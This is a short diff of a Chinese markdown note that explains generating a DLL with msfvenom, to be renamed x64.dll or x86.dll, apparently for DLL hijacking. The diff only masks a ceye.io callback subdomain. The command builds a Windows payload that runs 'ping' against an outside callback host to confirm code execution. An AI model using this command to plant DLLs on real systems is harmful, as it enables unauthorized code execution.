@@ -4,5 +4,5 @@
 使用msf生成dll，修改名称为x64.dll或者x86.dll
 ## 生成方法
 ```
-msfvenom -p windows/x64/exec CMD="ping vxqxor.ceye.io" EXITFUNC=process -f dll > /Users/Nibeshe/Desktop/x64.dll
+msfvenom -p windows/x64/exec CMD="ping ****.ceye.io" EXITFUNC=process -f dll > /Users/Nibeshe/Desktop/x64.dll
 ```
